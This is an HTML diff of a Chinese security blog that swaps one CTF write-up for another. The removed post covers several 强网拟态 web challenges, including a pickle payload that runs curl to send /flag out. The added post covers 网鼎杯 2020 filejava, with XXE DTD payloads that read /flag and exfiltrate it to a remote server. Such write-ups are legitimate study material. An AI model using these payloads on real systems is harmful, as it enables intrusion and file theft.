@@ -18,7 +18,7 @@
   <meta name="author" content="KKfine&#39;s blog">
   <meta name="keywords" content="">
   
-  <title>强网拟态 - KKfine&#39;s blog</title>
+  <title>java做题1 - KKfine&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -158,12 +158,12 @@
 </nav>
 
     <div class="banner" id="banner" parallax=true
-         style="background: url('/img/5.jpg') no-repeat center center;
+         style="background: url('/img/17.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="强网拟态">
+            <span class="h2" id="subtitle" title="java做题1">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-11-07 12:46" pubdate>
-        2021年11月7日 下午
+      <time datetime="2021-11-06 22:06" pubdate>
+        2021年11月6日 晚上
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      415 字
+      250 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      3
        分钟
     </span>
   
@@ -225,20 +225,29 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">强网拟态</h1>
+            <h1 style="display: none">java做题1</h1>
             
             <div class="markdown-body">
-              <h3 id="zerocalc"><a href="#zerocalc" class="headerlink" title="zerocalc"></a>zerocalc</h3><p>题目提示readFile(“./src/index.js”)，所以尝试readFile(“/flag”)得到flag</p>
-<p><img src="https://md.buptmerak.cn/uploads/upload_58b9e93800f31335dac6f874a29cfa1a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h3 id="new-hospital"><a href="#new-hospital" class="headerlink" title="new_hospital"></a>new_hospital</h3><p>扫描目录。可以发现/old/ 以及/flag.php。<br>然后通过awvs可以发现，在feature.php下有一个api会利用Cookie include文件。<br>发现/feature不是很好用，利用/old/feature.php来包含任意文件。直接包含/var/www/html/flag.php即可。</p>
-<h3 id="EasyFilter"><a href="#EasyFilter" class="headerlink" title="EasyFilter"></a>EasyFilter</h3><p>提供了写入和读取两种操作，b64参数c之后写入文件内<br>写入之后会返回文件名，接下来的问题是怎么在包含时能够解码文件，因为读取时只能控制”resource=”后面的内容<br>构造<code>r=convert.base64-decode/../xxx</code><br>拼接后成为<code>php://filter/resource=./files/convert.base64-decode/../xxx</code><br>调用了转换过滤器的同时又把<code>convert.base64-decode</code>当成了一个文件名，加<code>../</code>进行目录穿越后包含到恶意代码(上面会有一堆报错，雀氏挺另类的)<br><img src="https://md.buptmerak.cn/uploads/upload_23403d8ce8b50e2a191d26e8bbbf55dd.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h3 id="Jack-Shiro"><a href="#Jack-Shiro" class="headerlink" title="Jack-Shiro"></a>Jack-Shiro</h3><p>天翼杯原题，首先/;/绕过，然后<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a>直接打<br><img src="https://md.buptmerak.cn/uploads/upload_fa14a8e59c7d21682ccfa66c4d509322.png" srcset="/img/loading.gif" lazyload alt="img"><br><img src="https://md.buptmerak.cn/uploads/upload_7cfd9ce031a9680de9c4b5ac6c981662.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h3 id="Give-me-your-0day"><a href="#Give-me-your-0day" class="headerlink" title="Give_me_your_0day"></a>Give_me_your_0day</h3><p>安装页面存在数据库连接操作，考虑用<a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">rogue_mysql</a>搭建恶意mysql server，尝试后发现被forbidden了<img src="https://md.buptmerak.cn/uploads/upload_6fa66bf83711125947b7942d00635bd9.png" srcset="/img/loading.gif" lazyload alt="img"><br>观察install.php后，发现题目提供了多个数据库选择。选择mysqli后成功得到flag<img src="https://md.buptmerak.cn/uploads/upload_9f0816d213c0d813ac6a973bae2a487a.png" srcset="/img/loading.gif" lazyload alt="img"><br><img src="https://md.buptmerak.cn/uploads/upload_f94b19fd43118d06ecf04e9a01bfe0fa.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h3 id="ezPickle"><a href="#ezPickle" class="headerlink" title="ezPickle"></a>ezPickle</h3><p>pickle反序列化题。在<code>config</code>中有后门，但是需要修改notadmin中的<code>admin</code>为<code>yes</code>。</p>
-<figure class="highlight xquery"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xquery">Class RestrictedUnpickler(pickle.Unpickler):<br>    def find_class(self, <span class="hljs-keyword">module</span>,<span class="hljs-built_in"> name</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">module</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;config&#x27;</span>] <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;__&quot;</span><span class="hljs-built_in"> not</span> <span class="hljs-keyword">in</span><span class="hljs-built_in"> name</span>:<br>            <span class="hljs-keyword">return</span> getattr(sys.modules[<span class="hljs-keyword">module</span>],<span class="hljs-built_in"> name</span>)<br>        raise pickle.UnpicklingError(<span class="hljs-string">&quot;&#x27;%s.%s&#x27; not allowed&quot;</span> % (<span class="hljs-keyword">module</span>,<span class="hljs-built_in"> name</span>))<br></code></pre></div></td></tr></table></figure>
+              <h1 id="网鼎杯-2020-filejava"><a href="#网鼎杯-2020-filejava" class="headerlink" title="网鼎杯 2020 filejava"></a>网鼎杯 2020 filejava</h1><p><a target="_blank" rel="noopener" href="https://www.4armed.co/blog/exploiting-xxe-with-excel/">https://www.4armed.co/blog/exploiting-xxe-with-excel/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7747">https://xz.aliyun.com/t/7747</a></p>
+<p>下载文件处有filename目录穿越，结合报错可知道源码位置从而dump下源码开始审计</p>
+<p><img src="https://img-blog.csdnimg.cn/afd99418b023483389e6210ebb2497d1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/a2f5a947cd70454cb3c03923d962d22c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>看到这里就很明显了，判断后缀名应该是xlsx，开头限制了为excel-，考的就是excel进行xxe攻击</p>
+<p>最开始使用得是这种打法</p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;<br>&lt;!DOCTYPE ANY[<br>&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;<br>&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;vps:2122&#x2F;1.dtd&quot;&gt;<br>%remote;<br>%all;<br>]&gt;<br>&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;<br></code></pre></div></td></tr></table></figure>
 
-<p>观察发现限定了<code>c</code>操作符加载的<code>module</code>为<code>config</code>，手搓个覆盖, 并且执行后门。</p>
-<figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">cconfig<br>notadmin<br>(S<span class="hljs-string">&#x27;admin&#x27;</span><br>S<span class="hljs-string">&#x27;yes&#x27;</span><br>ucconfig<br>backdoor<br>(S<span class="hljs-string">&#x27;exec(&quot;import os;os.system(&#x27;</span>curl ip -d <span class="hljs-string">`cat /flag`</span><span class="hljs-string">&#x27;)&quot;)&#x27;</span><br>tR.<br></code></pre></div></td></tr></table></figure>
+<p>1.dtd为</p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;vps:2122&#x2F;%file;&#39;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure>
+
+<p>感觉都行的，但是怎么打也打不通，后来换了一下，</p>
+<p><img src="https://img-blog.csdnimg.cn/5dc2c253ce9d42789fca303bd78f8296.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>file.dtd中为</p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;39.107.239.30:3333?p&#x3D;%file;&#39;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/023f546407c845e48a269462caf19bde.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/74b606bf5867403eae11993a981078cd.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h1 id="网鼎杯ThinkJava"><a href="#网鼎杯ThinkJava" class="headerlink" title="网鼎杯ThinkJava"></a>网鼎杯ThinkJava</h1>
             </div>
             <hr>
             <div>
@@ -247,7 +256,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                      <a class="hover-with-bg" href="/categories/java/">java</a>
                     
                   </div>
                 
@@ -255,9 +264,9 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
-                    
                       <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/java/">java</a>
                     
                   </div>
                 
@@ -274,9 +283,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/11/07/%E9%95%BF%E5%9F%8E%E6%9D%AF/">
+                      <a href="/2021/11/07/2021-11-%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">长城杯</span>
+                        <span class="hidden-mobile">强网拟态</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -284,8 +293,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/11/06/java%E5%81%9A%E9%A2%98(1)/">
-                        <span class="hidden-mobile">java做题1</span>
+                      <a href="/2021/11/06/2021-10-java%E5%AE%A1%E8%AE%A11/">
+                        <span class="hidden-mobile">java审计1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
